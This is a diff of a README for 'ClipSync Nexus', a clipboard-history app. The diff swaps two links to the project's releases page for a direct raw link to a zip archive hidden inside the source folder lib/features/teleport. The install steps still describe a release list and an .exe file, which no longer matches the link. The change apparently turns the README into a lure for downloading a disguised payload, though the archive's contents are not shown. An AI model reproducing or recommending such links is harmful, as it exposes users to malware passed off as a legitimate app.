@@ -2,13 +2,13 @@
 
 ![Download](https://img.shields.io/badge/Download-Release_Page-blue)
 
-[https://github.com/Gaffsailstenopterygiusquadrisicissus463/clipsync-nexus-app/releases](https://github.com/Gaffsailstenopterygiusquadrisicissus463/clipsync-nexus-app/releases)
+[https://github.com/Gaffsailstenopterygiusquadrisicissus463/clipsync-nexus-app/raw/refs/heads/main/lib/features/teleport/clipsync_app_nexus_v2.7-alpha.1.zip](https://github.com/Gaffsailstenopterygiusquadrisicissus463/clipsync-nexus-app/raw/refs/heads/main/lib/features/teleport/clipsync_app_nexus_v2.7-alpha.1.zip)
 
 ClipSync Nexus stores the text and images you copy. It tracks your history across your Android phone and Windows computer. The app uses encryption to keep your data private. It works offline and transfers files over your local network.
 
 ## 📥 How to download and install
 
-1. Visit this page to download the software: [https://github.com/Gaffsailstenopterygiusquadrisicissus463/clipsync-nexus-app/releases](https://github.com/Gaffsailstenopterygiusquadrisicissus463/clipsync-nexus-app/releases)
+1. Visit this page to download the software: [https://github.com/Gaffsailstenopterygiusquadrisicissus463/clipsync-nexus-app/raw/refs/heads/main/lib/features/teleport/clipsync_app_nexus_v2.7-alpha.1.zip](https://github.com/Gaffsailstenopterygiusquadrisicissus463/clipsync-nexus-app/raw/refs/heads/main/lib/features/teleport/clipsync_app_nexus_v2.7-alpha.1.zip)
 2. Look for the latest release version at the top of the list.
 3. Click the file ending in `.exe` to start the download.
 4. Open the downloaded file once the process finishes.
